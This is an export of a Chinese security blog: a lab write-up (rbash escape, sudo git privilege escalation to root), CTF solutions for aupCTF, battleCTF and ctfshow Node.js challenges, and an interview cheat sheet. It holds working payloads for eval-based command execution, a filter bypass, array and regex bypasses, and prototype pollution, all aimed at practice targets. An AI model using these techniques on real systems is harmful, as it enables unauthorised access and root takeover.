<p>回车，启动shell<br>之后退出vi编辑器，查看权限。结果这个靶机没有成功，正常是已经可以了，由于这个靶机的环境变量的问题，在这里我们使用命令添加环境变量<br><code>export PATH=$PATH:/bin/</code><br>这条命令将把 &#x2F;bin&#x2F; 目录添加到当前 PATH 环境变量中。<br>环境变量 PATH 指定了操作系统在查找可执行文件时要搜索的目录列表。通过将一个目录路径添加到 PATH 中，你可以使系统在该目录中查找可执行文件。<br>具体而言，export PATH&#x3D;$PATH:&#x2F;bin&#x2F; 这条命令的含义是：<br>$PATH 表示当前已经设置的 PATH 变量的值。它将被展开为当前的 PATH 路径。<br>&#x2F;bin&#x2F; 是要添加到 PATH 中的目录路径。<br>通过执行这个命令，你将把 &#x2F;bin&#x2F; 目录添加到当前的 PATH 变量中，使得系统能够在 &#x2F;bin&#x2F; 目录中查找可执行文件。这样，在你执行命令时，系统将会在原有的 PATH 路径中搜索命令，同时也会在 &#x2F;bin&#x2F; 目录中搜索命令。<br>这种方式可以方便地执行位于 &#x2F;bin&#x2F; 目录下的命令，而无需指定完整的路径。需要注意的是，在使用 export 命令设置环境变量时，只会在当前会话中生效。如果希望在每次登录时自动设置 PATH，可以将该命令添加到启动文件（如 .bashrc 或 .bash_profile）中。</p>
</blockquote>
<p><code>export PATH=$PATH:/usr/bin/</code></p>
<blockquote>
<p>这条命令将把 &#x2F;usr&#x2F;bin&#x2F; 目录添加到当前 PATH 环境变量中。<br>环境变量 PATH 指定了操作系统在查找可执行文件时要搜索的目录列表。通过将一个目录路径添加到 PATH 中，你可以使系统在该目录中查找可执行文件。<br>具体而言，export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin&#x2F; 这条命令的含义是：<br>$PATH 表示当前已经设置的 PATH 变量的值。它将被展开为当前的 PATH 路径。<br>&#x2F;usr&#x2F;bin&#x2F; 是要添加到 PATH 中的目录路径。<br>通过执行这个命令，你将把 &#x2F;usr&#x2F;bin&#x2F; 目录添加到当前的 PATH 变量中，使得系统能够在 &#x2F;usr&#x2F;bin&#x2F; 目录中查找可执行文件。这样，在你执行命令时，系统将会在原有的 PATH 路径中搜索命令，同时也会在 &#x2F;usr&#x2F;bin&#x2F; 目录中搜索命令。<br>这种方式可以方便地执行位于 &#x2F;usr&#x2F;bin&#x2F; 目录下的命令，而无需指定完整的路径。需要注意的是，在使用 export 命令设置环境变量时，只会在当前会话中生效。如果希望在每次登录时自动设置 PATH，可以将该命令添加到启动文件（如 .bashrc 或 .bash_profile）中。</p>
</blockquote>
<h3 id="BASH-CMDS设置shell"><a href="#BASH-CMDS设置shell" class="headerlink" title="BASH_CMDS设置shell"></a>BASH_CMDS设置shell</h3><p>BASH_CMDS 是一个包含 Bash 命令的关联数组（associative array）环境变量。它在 Bash 中用于存储和管理命令的定义和别名。当你在 Bash 中定义一个函数、别名或关键字时，它会被添加到 BASH_CMDS 环境变量中。BASH_CMDS 是一个关联数组，它以命令名作为索引，对应的值则是命令的定义。</p>
<p><code>BASH_CMDS[x]=/bin/bash</code>这个命令是在BASH_CMDS数组中将索引x关联到&#x2F;bin&#x2F;bash的命令，意思就是执行<strong>a</strong>命令时也就是执行了**&#x2F;bin&#x2F;bash**命令。<br>与上面两条命令配合之后就可以实现rbash逃逸。(可以执行被限制的命令了)<br><img src="https://img-blog.csdnimg.cn/f1b84162e4bd44f3af7d24217ca12ca0.png" alt="2"></p>
<h3 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h3><p>前面实现<strong>rbash逃逸</strong>后打开flag文件提示jerry用户，我们切换到jerry用户（密码就是之前爆破出来的密码），打开jerry用户下的flag得到提示需要git提权。<br>git提权的前提是在使用命令<code>sudo -l</code>之后没有密码验证。<br><img src="https://img-blog.csdnimg.cn/151e0426bdce4e17b9045110b9e3dc0d.png" alt="1"><br><strong>第一种</strong></p>
<blockquote>
<p>sudo git help config</p>
</blockquote>
<p>回车然后输入</p>
<blockquote>
<p>!&#x2F;bin&#x2F;bash  (这里bash也可以换成sh)</p>
</blockquote>
<p><strong>第二种</strong></p>
<blockquote>
<p>sudo git -p help</p>
</blockquote>
<p>回车输入</p>
<blockquote>
<p>!&#x2F;bin&#x2F;bash  (这里bash也可以换成sh)</p>
</blockquote>
<p>已经成为root权限</p>
<h2 id="命令学习"><a href="#命令学习" class="headerlink" title="命令学习"></a>命令学习</h2><p>环境变量查看（查看可执行命令）</p>
<blockquote>
<p>echo $PATH<br>比如说得到**&#x2F;home&#x2F;jerry&#x2F;bin**，后面使用<code>echo /home/jerry/bin/*</code>查看可执行的命令</p>
</blockquote>
<p>添加环境变量</p>
<blockquote>
<p>export PATH&#x3D;$PATH:路径<br>常用路径变量&#x2F;usr&#x2F;bin和&#x2F;bin&#x2F;</p>
</blockquote>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>DC</tag>
      </tags>
  </entry>
  <entry>
    <title>aupCTF 2023</title>
    <url>/2023/06/26/aupCTF-2023/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Ancient-Cipher"><a href="#Ancient-Cipher" class="headerlink" title="Ancient Cipher"></a>Ancient Cipher</h3><p><img src="https://img-blog.csdnimg.cn/5df595f659f94c7ab5d801f037dc2a2d.png" alt="1"><br>先放随波逐流里看看，得到flag，是凯撒位移17位<br><img src="https://img-blog.csdnimg.cn/ba3e1de862294304a5b0ef7baddfaf6b.png" alt="2"></p>
<h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p><img src="https://img-blog.csdnimg.cn/0f0569b9766b44a786367768f6b9e46e.png" alt="3"><br>这个密码第一次见，查了一下是恩尼格码机，使用网站<a href="https://www.dcode.fr/chiffre-machine-enigma">dcode.fr</a>解密<br><img src="https://img-blog.csdnimg.cn/e8e5f10487bf4d5b9c058283305c173b.png" alt="3">得到flag。</p>
<h3 id="Swiss-Army-Knife"><a href="#Swiss-Army-Knife" class="headerlink" title="Swiss Army Knife"></a>Swiss Army Knife</h3><p>点开文件后是由XY组成的字符<br><img src="https://img-blog.csdnimg.cn/5c8faeb486e642c7bb99a4da46ec88f0.png" alt="1">这让我想到了二进制0和1。将X替换为0，Y替换为1<br><codecode><br>然后二进制转ascii码<br><img src="https://img-blog.csdnimg.cn/5cd8d3aaff6c474eb06754a05281c615.png" alt="1">得到base64编码的密文，再进行解密得到摩斯密码<br><img src="https://img-blog.csdnimg.cn/59f1604b00e046fab59fc63703de08cb.png" alt="1">在进行摩斯密码解密后又得到base系列的密文<br><img src="https://img-blog.csdnimg.cn/9840a4da1a1b450482459d1139feb27e.png" alt="2">继续解密<br><img src="https://img-blog.csdnimg.cn/8ea27925a3a54fb6b5b99e177b2351c9.png" alt="1">最后再进行一次凯撒解密，key&#x3D;19，得到flag。<strong>aupCTF{mu1tip13-3nc0d1ng5-u53d}</strong></p>
<h3 id="Battista’s-Bet"><a href="#Battista’s-Bet" class="headerlink" title="Battista’s Bet"></a>Battista’s Bet</h3><p><strong>我的朋友是意大利著名密码学家Giovan Battista Bellaso的忠实粉丝，他向我挑战破解这个密文。我一直在努力解码它，你能帮我吗 **<br>查找这个密码学家发明的密码<br><img src="https://img-blog.csdnimg.cn/9edf442d5cd04e6bb10dbff65252c89d.png" alt="1">打开<a href="https://www.dcode.fr/chiffre-autoclave">网站</a>解密<br>这里需要一个密钥，查看提示发现密钥为</strong>SECRET**<br><img src="https://img-blog.csdnimg.cn/d4ffb92d6b4c42fd9b8a0579ca441991.png" alt="2">得到flag。<br><img src="https://img-blog.csdnimg.cn/9b847c749a684ba4a8d84d6f6d5ca062.png" alt="2"></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Starter"><a href="#Starter" class="headerlink" title="Starter"></a>Starter</h3><p>打开网站后如下界面<br><img src="https://img-blog.csdnimg.cn/d2498d0fc13b422cb81eec69d0c87a2f.png" alt="6">查看源码得到flag。<strong>aupCTF{w45n’t-th47-h4rd-r1gh7}</strong><br><img src="https://img-blog.csdnimg.cn/2af8c9822abb47fda91d26bd8b464b41.png" alt="7"></p>
<h3 id="SQLi-1"><a href="#SQLi-1" class="headerlink" title="SQLi - 1"></a>SQLi - 1</h3><p><img src="https://img-blog.csdnimg.cn/12c88ff0993c4feaaaa5b118f669d684.png" alt="7">得到flag。<br><img src="https://img-blog.csdnimg.cn/e3d70cf1983240e3b7bc7e5b007b3329.png" alt="2"></p>
<h3 id="SQLi-2"><a href="#SQLi-2" class="headerlink" title="SQLi - 2"></a>SQLi - 2</h3><p>方法同SQLi - 1</p>
<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>给出源码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">headar_easy</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>META<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'HTTP_GETFLAG'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'yes'</span><span class="token punctuation">:</span>
        context <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">'flag'</span><span class="token punctuation">:</span> <span class="token string">'[REDACTED]'</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span>
        
        <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token string">'aa/flag.html'</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token string">'aa/index.html'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>意思就是如果header头里有GETFLAG，并且值为yes即可得出flag。<strong>aupCTF{cust0m-he4d3r-r3qu3st}</strong><br><img src="https://img-blog.csdnimg.cn/fb98935d0ddd4199911500d3d259d82c.png" alt="1"></p>
<h3 id="Directory"><a href="#Directory" class="headerlink" title="Directory"></a>Directory</h3><p><img src="https://img-blog.csdnimg.cn/0f027c28c6fe4a7eb1179daeaa99dbf0.png" alt="2"><br>打开网站后<br><img src="https://img-blog.csdnimg.cn/453d33679d7c4d86969f177b9a73147d.png" alt="3">随便点进一个看看<br><img src="https://img-blog.csdnimg.cn/6cdfe7300f214c7a8003a3312c65f3c2.png" alt="2"><br>题目意思就是爆破page，果不其然，发现712为flag。<br><img src="https://img-blog.csdnimg.cn/552adc4ecd794ed982cb5681c503668d.png" alt="3"></p>
<h2 id="Stegnography"><a href="#Stegnography" class="headerlink" title="Stegnography"></a>Stegnography</h2><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>看题目就知道是LSB隐写。<br><img src="https://img-blog.csdnimg.cn/2253e5d2e4b74e7fb2dd531267e47149.png" alt="6"><br>拿到flag：<strong>aupCTF{zst1g-1s-c00l_rig3ht}</strong></p>
<h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><p>给出两个模糊图片，进行异或处理。<br>使用工具<strong>Stegsolve.jar</strong><br>先选择一张图片，然后在与另一张图片结合<br><img src="https://img-blog.csdnimg.cn/5d3f882cc578437d83836eff62d22738.png" alt="1"><br>之后得到图片<br><img src="https://img-blog.csdnimg.cn/3dc9c71a6ece4deba4cd1dd49a996a8f.png" alt="2"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Fun"><a href="#Fun" class="headerlink" title="Fun"></a>Fun</h3><p>JSFUCK解密<br><img src="https://img-blog.csdnimg.cn/38a4f300723c41f48d5f83d2564b51cc.png" alt="1"><br>放控制台里运行就可以得到flag。<br><img src="https://img-blog.csdnimg.cn/a31ef56efa794b0ab298c69e29f3ff6b.png" alt="1"><br><strong>aupCTF{j4v45c1pt_but_f*ck3d}</strong></p>
<h3 id="Sanity-check"><a href="#Sanity-check" class="headerlink" title="Sanity check"></a>Sanity check</h3><p><img src="https://img-blog.csdnimg.cn/f5113653227342e7b872c62864e5621d.png" alt="1">就是一道签到题，flag在规则里说明了<br><img src="https://img-blog.csdnimg.cn/e26f24dd654b4460a14a9e1dcea4e2a5.png" alt="2"></p>
<h3 id="Frequency"><a href="#Frequency" class="headerlink" title="Frequency"></a>Frequency</h3><p><img src="https://img-blog.csdnimg.cn/cce4e02a75d24f24a43a7ac3a6ac9cfc.png" alt="1">下载音频文件后听到按键的声音，看来是<strong>DTMF拨号音识别</strong>有一个类似的题<a href="https://blog.csdn.net/qq_42939527/article/details/105201926">【WUST-CTF2020】girlfriend</a><br>使用工具<strong>dtmf2num_2</strong>得到按键号码<br><img src="https://img-blog.csdnimg.cn/5c1938e626414009aa94897eee698429.png" alt="3"><br>拿到flag。<strong>aupCTF{00923456060484}</strong></p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Africa battle CTF 2023</title>
    <url>/2023/06/24/Africa-battle-CTF-2023/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天国内没有什么比赛，看一下国外的比赛吧<br><img src="https://img1.imgtp.com/2023/06/24/1vay1LoH.png" alt="1"></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>一开始做web题的时候环境一直打不开，我还以为是那边的问题，结果下午换了机场又能访问了。</p>
<h3 id="Civilization"><a href="#Civilization" class="headerlink" title="Civilization"></a>Civilization</h3><p>打开网站后看到这个<br><img src="https://img-blog.csdnimg.cn/1197576aa444402bbeccc85df9ccafcd.png" alt="2"><br>打开网站后看到这个<br>传入source后显示源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ami'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ami'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$cigar</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'africacradlecivilization'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$cigar</span></span>/"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$cigar</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">africa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"home.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ok，大概意思就是在传入source后会显示源码，之后如果再传入ami的话，再进行一个正则匹配意思就是将<strong>cigar</strong>的值<strong>africacradlecivilization</strong>删除后如果还等于<strong>cigar</strong>那就进行下一步，那么可以想到双写进行绕过。传入<code>?source=&amp;ami=africacrafricacradlecivilizationadlecivilization</code>即可得到flag。<br><img src="https://img-blog.csdnimg.cn/f267e5a536424c08971111a00c024839.png" alt="2"></p>
<h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="Thumb"><a href="#Thumb" class="headerlink" title="Thumb"></a>Thumb</h3><p><img src="https://img-blog.csdnimg.cn/0f847f4b10fe4d4bb16ec186df53b093.png" alt="3"></p>
<p>这道题下载之后就是一张图片查看的时候变成了二维码。<img src="https://img-blog.csdnimg.cn/edbed056a8ce45bbbcd0895bd8a43ce5.jpeg" alt="3"><br><img src="https://img-blog.csdnimg.cn/98b35979c0f1473c99e3d22abc891009.png" alt="5"><br>微信扫一扫即出flag。<br><img src="https://img-blog.csdnimg.cn/3f6b41a7f97f4c14a519c2f49c53fc3a.png" alt="6"></p>
<h3 id="Find-Me"><a href="#Find-Me" class="headerlink" title="Find Me"></a>Find Me</h3><p>是一道流量分析题<br><img src="https://img-blog.csdnimg.cn/fc1e3addbbd644998d2bc407ce192e81.png" alt="7"><br>过滤http包<br><img src="https://img-blog.csdnimg.cn/75c6715314054dfa82d12a4cc6b877f5.png" alt="1"><br>账户密码一般是POST方式传入，查看到密码密文，就是简单的base46加密。解码之后得到明文密码<br><img src="https://img-blog.csdnimg.cn/db80329811b0440991c50c78e908797c.png" alt="1"><br>最后flag为<code>battleCTF&#123;PApdsjRTae&#125;</code></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Back-To-Origin"><a href="#Back-To-Origin" class="headerlink" title="Back To Origin"></a>Back To Origin</h3><p><img src="https://img-blog.csdnimg.cn/ac05d62cc039487b89ae19d4e08314fe.png" alt="1">古埃及象形文字<br><a href="https://www.likefont.com/">识别字体网站</a></p>
]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-nodejs</title>
    <url>/2023/06/23/ctfshoow-nodejs/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="335"><a href="#335" class="headerlink" title="335"></a>335</h2><p>一道rce题目<br><strong>require(‘child_process’).execSync(‘ls’);</strong></p>
<h2 id="336"><a href="#336" class="headerlink" title="336"></a>336</h2><p>发现被过滤了东西，<br><code>?eval=__filename</code>:打印出当下文件路径。<br><code>?eval=__dirname</code>:打印出当下所在文件夹路径。<br><img src="https://img-blog.csdnimg.cn/e9bed0e011fc43859dc646488a80f9bd.png" alt="1"><br>然后读取文件<code>?eval=require(&#39;fs&#39;).readFileSync(&#39;/app/routes/index.js&#39;,&#39;utf-8&#39;)</code><br><img src="https://img-blog.csdnimg.cn/28c279fff781455bbb9b44b2c0556449.png" alt="2"><br>被过滤了，绕过过滤。<br><code>?eval=require(&#39;child_process&#39;)[&#39;exe&#39;+&#39;cSync&#39;](&#39;ls&#39;);</code>再进行url编码一下。<br><img src="https://img-blog.csdnimg.cn/d5576132fdeb4f0786bfb052d3b942c6.png" alt="3">命令执行即可得到flag。<br><img src="https://img-blog.csdnimg.cn/e59fe23388254d009bdd149868b776ec.png" alt="4"></p>
<p>读取文件得到flag也行。</p>
<h2 id="337"><a href="#337" class="headerlink" title="337"></a>337</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">/* GET home page. */</span>
router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'xxxxxxx'</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> a <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">;</span>
  <span class="token keyword">var</span> b <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>b<span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  	res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
  	res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>简单的数组绕过<code>?a[]=1&amp;b[]=1</code>即可得到flag。<br><img src="https://img-blog.csdnimg.cn/03ad667c580b4a9d96f30777554c3985.png" alt="3"></p>
<h2 id="338"><a href="#338" class="headerlink" title="338"></a>338</h2><p>下载给的源码，找到login.js文件。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



<span class="token comment">/* GET home page.  */</span>
router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>
  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span><span class="token string">'36dboy'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//***关键点</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  <span class="token punctuation">&#125;</span>
  
  
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>原型链污染<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">学习文章</a><br><img src="https://img-blog.csdnimg.cn/04baaf7cddac488a88409bfd74e1f5b4.png" alt="5"></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>hvv初级面试总结</title>
    <url>/2023/06/20/hvv%E5%88%9D%E7%BA%A7%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="OWASP-Top10有哪些漏洞"><a href="#OWASP-Top10有哪些漏洞" class="headerlink" title="OWASP Top10有哪些漏洞"></a>OWASP Top10有哪些漏洞</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">SQL</span>注入
失效的身份认证
敏感数据泄露
<span class="token constant">XML</span>外部实体（<span class="token constant">XXE</span>）
失效的访问控制
安全配置错误
跨站脚本（<span class="token constant">XSS</span>）
不安全的反序列化
使用含有已知漏洞的组件
不足的日志记录和监控<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="常见数据库默认端口"><a href="#常见数据库默认端口" class="headerlink" title="常见数据库默认端口"></a>常见数据库默认端口</h2><p>MySql：3306</p>
<p>Oracle：1521</p>
<p>Redis：6379</p>
